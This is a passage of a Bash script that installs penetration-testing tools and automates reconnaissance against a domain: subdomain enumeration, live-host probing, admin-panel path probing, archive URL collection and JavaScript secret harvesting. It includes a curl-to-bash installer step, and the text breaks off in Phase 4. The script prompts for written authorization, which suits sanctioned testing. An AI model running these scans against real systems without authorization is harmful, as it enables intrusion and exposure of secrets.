#!/bin/bash
# ============================================================
#  Recon Toolkit v3 - Single File: Scan + Install + Doctor
#  Methodology: Subdomains -> Live -> URLs -> JS/Secrets ->
#  Params -> Fuzz -> 403 Bypass -> Injections -> SSL/Methods/
#  WebDAV -> WordPress -> Final Secrets Sweep -> HTML Report
# ============================================================

set -u
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
BLUE='\033[0;34m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODULES_DIR="$SCRIPT_DIR/modules"
LOG_DIR="$HOME/.recon/install_logs"
mkdir -p "$LOG_DIR"

log(){ echo -e "${GREEN}[+]${NC} $1"; }
warn(){ echo -e "${YELLOW}[!]${NC} $1"; }
err(){ echo -e "${RED}[-]${NC} $1"; }
info(){ echo -e "${BLUE}[i]${NC} $1"; }
step(){ echo -e "\n${CYAN}${BOLD}==================== $1 ====================${NC}"; }

banner() {
echo -e "${CYAN}"
cat << "EOF"
  ____                      _____           _ _    _ _
 |  _ \ ___  ___ ___  _ __ |_   _|__   ___ | | | _(_) |_
 | |_) / _ \/ __/ _ \| '_ \  | |/ _ \ / _ \| | |/ / | __|
 |  _ <  __/ (_| (_) | | | | | | (_) | (_) | |   <| | |_
 |_| \_\___|\___\___/|_| |_| |_|\___/ \___/|_|_|\_\_|\__|  v3
EOF
echo -e "${NC}"
}

ask() {
    [ "${RUN_ALL:-no}" = "yes" ] && return 0
    while true; do
        read -rp "$(echo -e "${YELLOW}[?]${NC} $1 [y/n]: ")" ans
        case "$ans" in
            [Yy]*) return 0 ;;
            [Nn]*) return 1 ;;
            *) echo "Please answer y or n." ;;
        esac
    done
}

check_bin() {
    command -v "$1" &>/dev/null && return 0
    warn "$1 not found in PATH, skipping this step (run Install option to get it)."
    return 1
}

# Print only the first N lines of a (possibly huge) result file, with a
# pointer to the full file + HTML report instead of flooding the terminal.
show_capped() {
    local file="$1" max="${2:-15}"
    [ -s "$file" ] || return 0
    local total; total=$(wc -l < "$file" 2>/dev/null || echo 0)
    head -n "$max" "$file"
    [ "$total" -gt "$max" ] && info "... and $((total - max)) more line(s) -- full list: $file (also in the HTML report)"
}

INTERRUPTED=0
trap 'INTERRUPTED=1' SIGINT

# run_task "label" "watched_file" -- cmd args...
# Runs cmd in background, shows a live spinner + elapsed time + growing
# line count, so long steps never look frozen -- without letting the
# wrapped tool's own stdout flood the terminal (callers should redirect
# the tool's own output to its -o file and >/dev/null).
# Ctrl+C during this: the current tool is killed and run_task returns 130
# instead of taking the whole script down, so the scan moves on to the
# next phase.
run_task() {
    local label="$1"; shift
    local watch_file="$1"; shift
    local start_ts; start_ts=$(date +%s)
    ( "$@" ) &
    local pid=$!
    local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    local i=0
    while kill -0 "$pid" 2>/dev/null; do
        if [ "$INTERRUPTED" = "1" ]; then
            kill "$pid" 2>/dev/null
            wait "$pid" 2>/dev/null
            printf "\r%-100s\r" " "
            warn "$label interrupted by user (Ctrl+C) -- moving to next phase."
            INTERRUPTED=0
            return 130
        fi
        local elapsed=$(( $(date +%s) - start_ts ))
        local cnt=0
        [ -f "$watch_file" ] && cnt=$(wc -l < "$watch_file" 2>/dev/null || echo 0)
        printf "\r${CYAN}%s${NC} %s ${DIM}[%ss elapsed | %s lines so far -- Ctrl+C to skip this step]${NC}   " \
            "${spin:i++%${#spin}:1}" "$label" "$elapsed" "$cnt"
        sleep 0.3
    done
    wait "$pid"
    local rc=$?
    local elapsed=$(( $(date +%s) - start_ts ))
    local cnt=0
    [ -f "$watch_file" ] && cnt=$(wc -l < "$watch_file" 2>/dev/null || echo 0)
    printf "\r%-100s\r" " "
    if [ $rc -eq 0 ]; then
        log "$label done in ${elapsed}s -> ${cnt} lines"
    else
        warn "$label finished with a non-zero exit (${elapsed}s) -> ${cnt} lines"
    fi
    return $rc
}

# dedupe_params <input_file> <output_file>
# Keeps only one URL per unique "shape" (path + sorted param NAMES, values
# ignored). Without this, sqlmap/xss end up re-testing the exact same
# injection point across dozens of near-identical vhosts/pages.
dedupe_params() {
    local infile="$1" outfile="$2"
    awk -F'?' '
        NF < 2 { next }
        {
            split($2, pairs, "&"); n = 0
            for (i in pairs) { split(pairs[i], kv, "="); names[++n] = kv[1] }
            for (i = 1; i <= n; i++) {
                for (j = i+1; j <= n; j++) {
                    if (names[j] < names[i]) { t = names[i]; names[i] = names[j]; names[j] = t }
                }
            }
            key = $1
            for (i = 1; i <= n; i++) key = key "|" names[i]
            if (!(key in seen)) { seen[key] = 1; print $0 }
            delete names
        }
    ' "$infile" > "$outfile" 2>/dev/null
}

# Every install step logs full stdout+stderr instead of throwing it away.
run_logged() {
    local name="$1"; shift
    local logfile="$LOG_DIR/${name}.log"
    if "$@" > "$logfile" 2>&1; then
        log "$name: OK"
        return 0
    else
        err "$name: FAILED - last 15 lines of $logfile:"
        tail -15 "$logfile" | sed 's/^/      /'
        return 1
    fi
}

resolve_path() {
    export GOPATH="${GOPATH:-$HOME/go}"
    export PATH="$PATH:$(go env GOPATH 2>/dev/null || echo "$GOPATH")/bin:$HOME/.local/bin:$HOME/.cargo/bin:$HOME/.gem/bin:/usr/local/go/bin:/usr/local/bin"
}
resolve_path

# This toolkit targets Kali Linux specifically -- wordlist paths, seclists,
# and several apt package names assume a Kali install. It will likely
# still run on Debian/Ubuntu with extra manual setup, but that's not
# what it's built/tested for.
check_kali() {
    if [ -f /etc/os-release ] && grep -qi "kali" /etc/os-release; then
        return 0
    fi
    warn "This toolkit is built for Kali Linux. Your OS doesn't identify as Kali (checked /etc/os-release)."
    warn "It may still work, but wordlist paths, package names, and pre-installed tool assumptions are Kali-specific."
}

# ---------------- Resume / checkpoint support ----------------
# Each phase, once it finishes successfully, drops a marker file. If the
# scan gets interrupted (power cut, laptop shutdown, etc.) and you re-run
# the toolkit against the same domain, completed phases are skipped
# instead of re-running from scratch.
phase_marker() { echo "$BASE/.done_$1"; }
phase_done() { [ -f "$(phase_marker "$1")" ]; }
mark_done() { touch "$(phase_marker "$1")"; }

# ============================================================
#  DOCTOR: fast tool audit (existence check only -- no updates,
#  no network calls, so it's safe to run before every scan).
# ============================================================
doctor() {
    step "Tool Audit"
    resolve_path
    local tools=(subfinder assetfinder httpx waybackurls gau qsreplace gf katana nuclei ffuf \
                 wpprobe dalfox gobypass403 uro dirsearch feroxbuster sqlmap xsser paramspider \
                 secretfinder testssl.sh wpscan davtest jq curl python3 git go)
    local ok=0 bad=0
    for t in "${tools[@]}"; do
        if p=$(command -v "$t" 2>/dev/null); then
            printf "  ${GREEN}[OK]${NC}      %-14s -> %s\n" "$t" "$p"
            ok=$((ok+1))
        else
            printf "  ${RED}[MISSING]${NC} %-14s\n" "$t"
            bad=$((bad+1))
        fi
    done
    echo ""
    log "Doctor: $ok found, $bad missing."
    [ $bad -gt 0 ] && info "Run option 2 (Install) to fetch missing tools. Install logs: $LOG_DIR/"
}

# ============================================================
#  INSTALL: everything needed to run a full scan.
# ============================================================
install_tools() {
step "Go toolchain"
GO_MIN_MINOR=21
current_go_ok() {
    command -v go &>/dev/null || return 1
    local ver; ver=$(go version | grep -oE 'go[0-9]+\.[0-9]+' | tr -d 'go')
    local major=${ver%%.*}; local minor=${ver##*.}
    [ "$major" -gt 1 ] && return 0
    [ "$minor" -ge "$GO_MIN_MINOR" ]
}
if current_go_ok; then
    log "Go already OK: $(go version)"
else
    warn "System Go is missing or too old (apt's golang-go is often outdated). Installing a modern Go toolchain..."
    GO_ARCH="amd64"; [ "$(uname -m)" = "aarch64" ] && GO_ARCH="arm64"
    GO_LATEST=$(curl -fsSL https://go.dev/VERSION?m=text 2>/dev/null | head -1)
    [ -z "$GO_LATEST" ] && GO_LATEST="go1.23.4"
    if run_logged "go_download" curl -fsSL "https://go.dev/dl/${GO_LATEST}.linux-${GO_ARCH}.tar.gz" -o /tmp/go.tar.gz; then
        sudo rm -rf /usr/local/go
        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
    fi
    grep -qxF 'export PATH=$PATH:/usr/local/go/bin' "$HOME/.bashrc" 2>/dev/null || echo 'export PATH=$PATH:/usr/local/go/bin' >> "$HOME/.bashrc"
    export PATH="$PATH:/usr/local/go/bin"
    current_go_ok && log "Go installed: $(go version)" || err "Go install still failed. Check https://go.dev/doc/install manually."
fi

GOBIN_DIR="$(go env GOPATH 2>/dev/null || echo "$HOME/go")/bin"
mkdir -p "$GOBIN_DIR"
export PATH="$PATH:$GOBIN_DIR:$HOME/.local/bin:$HOME/.cargo/bin:$HOME/.gem/bin:/usr/local/bin"
export GOPROXY="${GOPROXY:-https://proxy.golang.org,direct}"
log "Go binaries will land in: $GOBIN_DIR"

step "APT base packages"
sudo apt update -y
run_logged "apt_base" sudo apt install -y git curl wget jq python3 python3-pip python3-venv \
    build-essential ruby ruby-dev libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev \
    zlib1g-dev seclists cargo davtest nikto

step "Go-based recon tools"
declare -A GO_TOOLS=(
    [subfinder]="github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
    [assetfinder]="github.com/tomnomnom/assetfinder@latest"
    [httpx]="github.com/projectdiscovery/httpx/cmd/httpx@latest"
    [waybackurls]="github.com/tomnomnom/waybackurls@latest"
    [gau]="github.com/lc/gau/v2/cmd/gau@latest"
    [qsreplace]="github.com/tomnomnom/qsreplace@latest"
    [gf]="github.com/tomnomnom/gf@latest"
    [katana]="github.com/projectdiscovery/katana/cmd/katana@latest"
    [nuclei]="github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    [ffuf]="github.com/ffuf/ffuf/v2@latest"
    [wpprobe]="github.com/Chocapikk/wpprobe@latest"
    [dalfox]="github.com/hahwul/dalfox/v2@latest"
)
FAILED_GO_TOOLS=()
for tool in "${!GO_TOOLS[@]}"; do
    if command -v "$tool" &>/dev/null; then
        log "$tool: already installed ($(command -v "$tool"))"
        continue
    fi
    if run_logged "go_install_${tool}" go install -v "${GO_TOOLS[$tool]}"; then
        [ -f "$GOBIN_DIR/$tool" ] || { err "$tool: reported OK but binary missing from $GOBIN_DIR"; FAILED_GO_TOOLS+=("$tool"); }
    else
        FAILED_GO_TOOLS+=("$tool")
    fi
done
[ ${#FAILED_GO_TOOLS[@]} -gt 0 ] && warn "Failed Go tools: ${FAILED_GO_TOOLS[*]} (see $LOG_DIR/go_install_<name>.log)"

step "gf patterns (SQLi/XSS/SSTI/redirect signatures)"
mkdir -p "$HOME/.gf"
[ -d "$HOME/Gf-Patterns" ] || run_logged "gf_patterns_clone" git clone https://github.com/1ndianl33t/Gf-Patterns "$HOME/Gf-Patterns"
cp -n "$HOME"/Gf-Patterns/*.json "$HOME/.gf/" 2>/dev/null
log "gf patterns copied to ~/.gf"

step "gobypass403 (built from source -- the precompiled binary route is unreliable, building it is)"
if ! command -v gobypass403 &>/dev/null; then
    mkdir -p "$HOME/.build"
    rm -rf "$HOME/.build/gobypass403"
    if run_logged "gobypass403_clone" git clone https://github.com/slicingmelon/gobypass403.git "$HOME/.build/gobypass403"; then
        (
            cd "$HOME/.build/gobypass403" || exit 1
            go mod tidy && go build -o gobypass403 ./cmd/...
        ) > "$LOG_DIR/gobypass403_build.log" 2>&1
        if [ -f "$HOME/.build/gobypass403/gobypass403" ]; then
            sudo mv "$HOME/.build/gobypass403/gobypass403" /usr/local/bin/gobypass403
            sudo chmod +x /usr/local/bin/gobypass403
            log "gobypass403 built and installed to /usr/local/bin"
        else
            err "gobypass403 build failed -- see $LOG_DIR/gobypass403_build.log"
        fi
    fi
else
    log "gobypass403 already installed."
fi

step "uro (URL de-duplication)"
run_logged "pip_uro" pip install --break-system-packages --upgrade uro

step "dirsearch"
if [ ! -d "$HOME/dirsearch" ]; then
    run_logged "dirsearch_clone" git clone --depth 1 https://github.com/maurosoria/dirsearch.git "$HOME/dirsearch"
    run_logged "dirsearch_pip" pip install --break-system-packages -r "$HOME/dirsearch/requirements.txt"
fi
sudo ln -sf "$HOME/dirsearch/dirsearch.py" /usr/local/bin/dirsearch 2>/dev/null
command -v dirsearch &>/dev/null && log "dirsearch: OK" || err "dirsearch: symlink failed, check $HOME/dirsearch"

step "feroxbuster"
command -v feroxbuster &>/dev/null || run_logged "feroxbuster_install" bash -c "curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s '$HOME/.local/bin'"

step "sqlmap"
if ! command -v sqlmap &>/dev/null; then
    run_logged "sqlmap_apt" sudo apt install -y sqlmap || {
        run_logged "sqlmap_clone" git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git "$HOME/sqlmap"
        [ -d "$HOME/sqlmap" ] && sudo ln -sf "$HOME/sqlmap/sqlmap.py" /usr/local/bin/sqlmap 2>/dev/null
    }
fi

step "xsser"
run_logged "xsser_apt" sudo apt install -y xsser || run_logged "xsser_pip" pip install --break-system-packages xsser

step "paramspider"
if [ ! -d "$HOME/ParamSpider" ]; then
    run_logged "paramspider_clone" git clone https://github.com/devanshbatham/ParamSpider "$HOME/ParamSpider"
    run_logged "paramspider_pip" pip install --break-system-packages -e "$HOME/ParamSpider"
fi

step "SecretFinder"
if [ ! -d "$HOME/SecretFinder" ]; then
    run_logged "secretfinder_clone" git clone https://github.com/m4ll0k/SecretFinder.git "$HOME/SecretFinder"
    run_logged "secretfinder_pip" pip install --break-system-packages -r "$HOME/SecretFinder/requirements.txt"
fi
sudo ln -sf "$HOME/SecretFinder/SecretFinder.py" /usr/local/bin/secretfinder 2>/dev/null

step "CredHunter (optional extra secret/param hunter)"
if [ ! -d "$HOME/CredHunter" ]; then
    if run_logged "credhunter_clone" git clone https://github.com/AS-AbdulSamad/CredHunter.git "$HOME/CredHunter"; then
        pip install --break-system-packages -r "$HOME/CredHunter/requirements.txt" 2>/dev/null
        log "CredHunter cloned to ~/CredHunter (see its own README for usage)."
    else
        warn "Could not clone AS-AbdulSamad/CredHunter (not found / private / renamed) -- skipping, not required."
        info "Note: this toolkit's built-in modules/js_secret_hunter.py and modules/ssrf_param_hunter.py already cover the same detection logic natively."
    fi
fi

step "testssl.sh"
[ -d "$HOME/testssl.sh" ] || run_logged "testssl_clone" git clone --depth 1 https://github.com/testssl/testssl.sh.git "$HOME/testssl.sh"
sudo ln -sf "$HOME/testssl.sh/testssl.sh" /usr/local/bin/testssl.sh 2>/dev/null

step "wpscan"
if ! command -v wpscan &>/dev/null; then
    run_logged "wpscan_gem" sudo gem install wpscan || {
        warn "gem install failed. Check ruby version (wpscan needs >=3.0): ruby -v"
        warn "Fallback: docker pull wpscanteam/wpscan"
    }
fi

step "wpprobe DB update (install-time only)"
command -v wpprobe &>/dev/null && wpprobe update-db 2>/dev/null

step "Resolvers list"
mkdir -p "$HOME/.recon"
curl -fsSL https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -o "$HOME/.recon/resolvers.txt" 2>/dev/null

step "Persisting PATH for future shells"
PATH_LINE="export PATH=\$PATH:$GOBIN_DIR:\$HOME/.local/bin:\$HOME/.cargo/bin:\$HOME/.gem/bin:/usr/local/go/bin"
for rc in "$HOME/.bashrc" "$HOME/.zshrc"; do
    [ -f "$rc" ] || continue
    grep -qxF "$PATH_LINE" "$rc" || echo "$PATH_LINE" >> "$rc"
done
log "PATH line added to ~/.bashrc / ~/.zshrc (whichever exist)."

doctor
echo ""
log "Install pass complete."
warn "Open a new terminal (or run 'source ~/.bashrc') so this shell also picks up the PATH changes."
}

# ---------------- Boot menu ----------------
clear
banner
check_kali
echo "1) Scan        - run recon/pentest against a domain (standard: y/n per phase, or Select All)"
echo "2) Install     - install/update all tools"
echo "3) Doctor      - quick check of what's installed (no changes made)"
echo "4) Custom Scan - choose exactly which phases to run"
echo ""
read -rp "$(echo -e "${CYAN}Choose an option [1/2/3/4]: ${NC}")" MODE

if [ "$MODE" = "2" ]; then
    install_tools
    exit 0
fi
if [ "$MODE" = "3" ]; then
    doctor
    exit 0
fi

HTTPX=$(command -v httpx-toolkit || command -v httpx || echo "")
if [ -z "$HTTPX" ]; then
    err "httpx / httpx-toolkit not found. Run Install (option 2) first."
    exit 1
fi

# ---------------- Custom phase selection (option 4) ----------------
CUSTOM_MODE="no"
declare -A SELECTED_PHASES
PHASE_MENU_KEYS=(P1 P2 P2b P3 P4 P5 P6 P7 P8 P9 P9a P9b P9c P10 P11 P12 P13 P14)
PHASE_MENU_LABELS=(
    "Subdomain Enumeration" "Live Subdomain Check" "Admin/Control Panel Spotting"
    "URL Collection (wayback/gau)" "JS Fetch + Secrets Scanning" "Katana Deep Crawl"
    "Parameter Discovery" "Directory Fuzzing" "403 Bypass" "Nuclei Scan"
    "All-Params SQLi/XSS" "gf-Pattern Injection Hunting" "Header Injection Check"
    "AWS/IAM Key Exposure" "SSL/TLS + HTTP Methods" "WebDAV Detection"
    "WordPress Detection/Scan" "Final Secrets Sweep"
)
if [ "$MODE" = "4" ]; then
    CUSTOM_MODE="yes"
    echo ""
    echo "Available phases:"
    for i in "${!PHASE_MENU_KEYS[@]}"; do
        printf "  %2d) %-32s [%s]\n" "$((i+1))" "${PHASE_MENU_LABELS[$i]}" "${PHASE_MENU_KEYS[$i]}"
    done
    echo ""
    read -rp "$(echo -e "${CYAN}Enter phase numbers to run, comma-separated (e.g. 1,2,4,7): ${NC}")" PHASE_SEL_INPUT
    IFS=',' read -ra RAW_SEL <<< "$PHASE_SEL_INPUT"
    for n in "${RAW_SEL[@]}"; do
        n="$(echo "$n" | xargs)"
        [[ "$n" =~ ^[0-9]+$ ]] || continue
        idx=$((n-1))
        [ "$idx" -ge 0 ] && [ "$idx" -lt "${#PHASE_MENU_KEYS[@]}" ] && SELECTED_PHASES["${PHASE_MENU_KEYS[$idx]}"]=1
    done
    [ ${#SELECTED_PHASES[@]} -eq 0 ] && { err "No valid phases selected, exiting."; exit 1; }
    log "Custom scan: ${#SELECTED_PHASES[@]} phase(s) selected -- all other phases will be skipped."
    RUN_ALL="yes"   # selected phases run without per-phase y/n prompts
fi
phase_selected() {
    [ "$CUSTOM_MODE" != "yes" ] && return 0
    [ -n "${SELECTED_PHASES[$1]:-}" ]
}

# ---------------- Fast preflight audit (existence checks only, no updates) ----------------
doctor
echo ""
if ! ask "Reviewed the tool list above? Continue with the scan?"; then
    err "Run Install (option 2) for anything missing, then re-run Scan."
    exit 1
fi

# ---------------- Domain + config ----------------
read -rp "$(echo -e "${CYAN}[+] Target domain (e.g. example.com): ${NC}")" DOMAIN
[ -z "$DOMAIN" ] && { err "Domain is empty, exiting."; exit 1; }

echo ""
read -rp "$(echo -e "${CYAN}Confirm: you have written authorization to test $DOMAIN [y/n]: ${NC}")" AUTH
[[ "$AUTH" =~ ^[Yy] ]] || { err "Authorization not confirmed, exiting."; exit 1; }

# ---------------- Resume detection ----------------
# If a previous scan for this exact domain got interrupted (no
# .scan_complete marker), offer to continue it instead of starting over.
RESUME_BASE=""
LATEST_INCOMPLETE=$(ls -dt recon_"${DOMAIN}"_* 2>/dev/null | while read -r d; do [ -f "$d/.scan_complete" ] || { echo "$d"; break; }; done)
if [ -n "$LATEST_INCOMPLETE" ]; then
    echo ""
    warn "Found an incomplete previous scan for $DOMAIN: $LATEST_INCOMPLETE"
    if ask "Resume it (skip phases already finished) instead of starting fresh?"; then
        RESUME_BASE="$LATEST_INCOMPLETE"
        log "Resuming from: $RESUME_BASE"
    fi
fi

echo ""
read -rp "$(echo -e "${CYAN}Out-of-scope subdomains/hosts (comma-separated, wildcards like *.dev.$DOMAIN allowed, blank if none): ${NC}")" OOS_INPUT
OOS_PATTERNS=()
if [ -n "$OOS_INPUT" ]; then
    IFS=',' read -ra RAW_OOS <<< "$OOS_INPUT"
    for p in "${RAW_OOS[@]}"; do
        p="$(echo "$p" | xargs)"
        [ -n "$p" ] && OOS_PATTERNS+=("$p")
    done
    log "${#OOS_PATTERNS[@]} out-of-scope pattern(s) recorded -- these will be excluded before any active testing."
fi
is_out_of_scope() {
    local host="$1"
    for p in "${OOS_PATTERNS[@]:-}"; do
        [ -z "$p" ] && continue
        if [[ "$p" == *"*"* ]]; then
            [[ "$host" == $p ]] && return 0
        else
            [[ "$host" == *"$p"* ]] && return 0
        fi
    done
    return 1
}

echo ""
if [ "$CUSTOM_MODE" = "yes" ]; then
    : # RUN_ALL already forced to yes for the selected phases
elif ask "Run all modules? (Select All - no further y/n prompts)"; then
    RUN_ALL="yes"
else
    RUN_ALL="no"
fi

read -rp "$(echo -e "${CYAN}Parallel workers (default 15): ${NC}")" PAR_IN
PARALLEL=${PAR_IN:-15}

RATE=40
THREADS=25
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

WORDLIST=""
for wl in /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
          /usr/share/wordlists/dirb/common.txt \
          /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; do
    [ -f "$wl" ] && WORDLIST="$wl" && break
done
if [ -z "$WORDLIST" ]; then
    warn "No default wordlist found. Fuzzing will be skipped unless you provide a path."
    read -rp "$(echo -e "${CYAN}Full path to a wordlist (blank to skip fuzzing): ${NC}")" WORDLIST
fi

if [ -n "$RESUME_BASE" ]; then
    BASE="$RESUME_BASE"
else
    TS=$(date +%Y%m%d_%H%M%S)
    BASE="recon_${DOMAIN}_${TS}"
fi
D1="$BASE/01_subdomains"; D2="$BASE/02_urls"; D3="$BASE/03_secrets"
D4="$BASE/04_fuzzing"; D5="$BASE/05_vulnscan"; D6="$BASE/06_katana"
D7="$BASE/07_params"; D8="$BASE/08_injections"; D9="$BASE/09_ssl_methods"
D10="$BASE/10_webdav"; D11="$BASE/11_wordpress"; D12="$BASE/12_admin_panels"
mkdir -p "$D1" "$D2" "$D3" "$D4" "$D5" "$D6" "$D7" "$D8" "$D9" "$D10" "$D11" "$D12"
log "Results folder: $(pwd)/$BASE"

# ============================================================
# PHASE 1: Subdomain Enumeration
# ============================================================
step "PHASE 1: Domain & Subdomain Enumeration"
if phase_done "P1"; then
    log "Resuming: Phase 1: Domain & Subdomain Enumeration previously completed, skipping."
elif ! phase_selected "P1"; then
    info "Phase 1: Domain & Subdomain Enumeration skipped (not selected in custom scan)."
elif ask "Collect subdomains? (subfinder + assetfinder + crt.sh)"; then
    check_bin subfinder && run_task "subfinder" "$D1/subfinder.txt" bash -c \
        "subfinder -d '$DOMAIN' -all -recursive -silent > '$D1/subfinder.txt' 2>/dev/null"
    check_bin assetfinder && run_task "assetfinder" "$D1/assetfinder.txt" bash -c \
        "assetfinder --subs-only '$DOMAIN' > '$D1/assetfinder.txt' 2>/dev/null"
    if check_bin curl && check_bin jq; then
        run_task "crt.sh lookup" "$D1/crtsh.txt" bash -c \
        "curl -s 'https://crt.sh/?q=%25.$DOMAIN&output=json' | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u > '$D1/crtsh.txt'"
    fi

    cat "$D1"/*.txt 2>/dev/null | sed '/^$/d' | sort -u > "$D1/all_subdomains_raw.txt"
    echo "$DOMAIN" >> "$D1/all_subdomains_raw.txt"
    sort -u -o "$D1/all_subdomains_raw.txt" "$D1/all_subdomains_raw.txt"

    if [ ${#OOS_PATTERNS[@]} -gt 0 ]; then
        > "$D1/all_subdomains.txt"; > "$D1/excluded_out_of_scope.txt"
        while read -r h; do
            if is_out_of_scope "$h"; then echo "$h" >> "$D1/excluded_out_of_scope.txt"
            else echo "$h" >> "$D1/all_subdomains.txt"; fi
        done < "$D1/all_subdomains_raw.txt"
        log "Excluded $(wc -l < "$D1/excluded_out_of_scope.txt") out-of-scope host(s) (see $D1/excluded_out_of_scope.txt)"
    else
        cp "$D1/all_subdomains_raw.txt" "$D1/all_subdomains.txt"
    fi
    log "Total in-scope subdomains: $(wc -l < "$D1/all_subdomains.txt" 2>/dev/null || echo 0)"
    mark_done "P1"
fi

# ============================================================
# PHASE 2: Live subdomain check
# ============================================================
step "PHASE 2: Live Subdomain Check"
if phase_done "P2"; then
    log "Resuming: Phase 2: Live Subdomain Check previously completed, skipping."
elif ! phase_selected "P2"; then
    info "Phase 2: Live Subdomain Check skipped (not selected in custom scan)."
elif [ -s "$D1/all_subdomains.txt" ] && ask "Check for live subdomains? (httpx)"; then
    run_task "httpx live check" "$D1/live_subdomains.txt" bash -c \
        "cat '$D1/all_subdomains.txt' | '$HTTPX' -silent -status-code -title -tech-detect -follow-redirects \
         -rate-limit $RATE -threads $THREADS -H 'User-Agent: $UA' -o '$D1/live_subdomains.txt' >/dev/null 2>&1"
    awk '{print $1}' "$D1/live_subdomains.txt" > "$D1/live_urls_only.txt" 2>/dev/null
    log "Live hosts: $(wc -l < "$D1/live_urls_only.txt" 2>/dev/null || echo 0)"
else
    warn "No subdomain list, or step skipped."
    [ -s "$D1/live_urls_only.txt" ] || echo "https://$DOMAIN" > "$D1/live_urls_only.txt"
    mark_done "P2"
fi

# ============================================================
# PHASE 2b: Admin / Control Panel Spotting
# ============================================================
step "PHASE 2b: Admin / Control Panel Spotting"
if phase_done "P2b"; then
    log "Resuming: Phase 2b: Admin / Control Panel Spotting previously completed, skipping."
elif ! phase_selected "P2b"; then
    info "Phase 2b: Admin / Control Panel Spotting skipped (not selected in custom scan)."
elif [ -s "$D1/live_subdomains.txt" ]; then
    grep -EiP '(?:^|[./_-])(admin|adm|cpanel|panel|portal|dashboard|manage|control|backoffice|backend|cms|webmail|mail|phpmyadmin|adminer|grafana|kibana|jenkins|portainer|pgadmin|webmin|plesk|gitlab|jira|sonarqube|vpn|vcenter|console|internal|staff|employee|sso|auth|login|manager)(?:[./_-]|$)' \
        "$D1/live_subdomains.txt" > "$D12/naming_matches.txt" 2>/dev/null
    if [ -s "$D12/naming_matches.txt" ]; then
        warn "Possible admin/control-panel host(s) by naming ($(wc -l < "$D12/naming_matches.txt")):"
        show_capped "$D12/naming_matches.txt" 15
    else
        log "No obvious admin panel by naming (fuzzing pass will also check)."
    fi

    if check_bin "$HTTPX"; then
        ADMIN_PATHS=",/admin,/administrator,/wp-admin,/cpanel,/phpmyadmin,/adminer.php,/manager/html,/portainer,/grafana,/kibana,/jenkins,/.well-known/security.txt,/server-status,/actuator,/console,/webmin,/pgadmin4"
        run_task "admin-path probe" "$D12/admin_paths_hits.txt" bash -c \
            "cat '$D1/live_urls_only.txt' | '$HTTPX' -silent -path '$ADMIN_PATHS' -mc 200,401,403 -threads $THREADS -H 'User-Agent: $UA' -o '$D12/admin_paths_hits.txt' >/dev/null 2>&1"
        if [ -s "$D12/admin_paths_hits.txt" ]; then
            warn "Common admin/control-panel paths responded:"
            show_capped "$D12/admin_paths_hits.txt" 15
        fi
    fi
    mark_done "P2b"
fi

# ============================================================
# PHASE 3: URL Collection (Waybackurls + Gau)
# ============================================================
step "PHASE 3: URL Collection"
if phase_done "P3"; then
    log "Resuming: Phase 3: URL Collection previously completed, skipping."
elif ! phase_selected "P3"; then
    info "Phase 3: URL Collection skipped (not selected in custom scan)."
elif ask "Collect URLs via Waybackurls + Gau?"; then
    check_bin waybackurls && run_task "waybackurls" "$D2/waybackurls.txt" bash -c \
        "cat '$D1/live_urls_only.txt' | waybackurls > '$D2/waybackurls.txt' 2>/dev/null"
    check_bin gau && run_task "gau" "$D2/gau.txt" bash -c \
        "cat '$D1/live_urls_only.txt' | gau --threads $PARALLEL > '$D2/gau.txt' 2>/dev/null"

    cat "$D2"/*.txt 2>/dev/null | sort -u > "$D2/all_urls.txt"
    check_bin uro && uro -i "$D2/all_urls.txt" -o "$D2/all_urls_clean.txt" 2>/dev/null
    [ -s "$D2/all_urls_clean.txt" ] || cp "$D2/all_urls.txt" "$D2/all_urls_clean.txt" 2>/dev/null
    grep -E '\.js(\?|$)' "$D2/all_urls_clean.txt" 2>/dev/null | sort -u > "$D2/js_urls.txt"
    log "Total URLs: $(wc -l < "$D2/all_urls_clean.txt" 2>/dev/null || echo 0) | JS files: $(wc -l < "$D2/js_urls.txt" 2>/dev/null || echo 0)"
    mark_done "P3"
fi

# ============================================================
# PHASE 4: JS fetch + Secrets Scanning (URL-attributed, printed to terminal)
# ============================================================
step "PHASE 4: JS Libraries + Secrets Scanning"
if phase_done "P4"; then
    log "Resuming: Phase 4: JS Libraries + Secrets Scanning previously completed, skipping."
elif ! phase_selected "P4"; then
    info "Phase 4: JS Libraries + Secrets Scanning skipped (not selected in custom scan)."
elif [ -s "$D2/js_urls.txt" ] && ask "Fetch JS files and scan for secrets?"; then
    mkdir -p "$D3/js_bodies"
    JS_COUNT=$(wc -l < "$D2/js_urls.txt" 2>/dev/null || echo 0)
    log "Fetching JS content ($JS_COUNT files, $PARALLEL parallel workers, up to 10s each)..."

    # Write a manifest (url<TAB>hash) as each download completes -- this is
    # what run_task watches, so the spinner shows real progress instead of
    # sitting silent for minutes on large JS lists.
    > "$D3/js_manifest.txt"
    run_task "JS download" "$D3/js_manifest.txt" bash -c '
        cat "'"$D2"'/js_urls.txt" | xargs -P '"$PARALLEL"' -I{} bash -c "
            url=\"{}\"
            f=\$(echo \"\$url\" | md5sum | cut -d\" \" -f1)
            curl -s -A \"'"$UA"'\" --max-time 10 \"\$url\" -o \"'"$D3"'/js_bodies/\$f.js\" 2>/dev/null
            printf \"%s\t%s\n\" \"\$url\" \"\$f\" >> \"'"$D3"'/js_manifest.txt\"
        "
    '

    # Tag every downloaded file with its source URL so secret hits can be
    # attributed back to exactly where they were found. The output
    # redirection wraps the WHOLE loop (opened once) instead of using >>
    # inside the loop (which reopens the file every iteration -- that
    # reopen cost is what was making this crawl on network/Windows-mounted
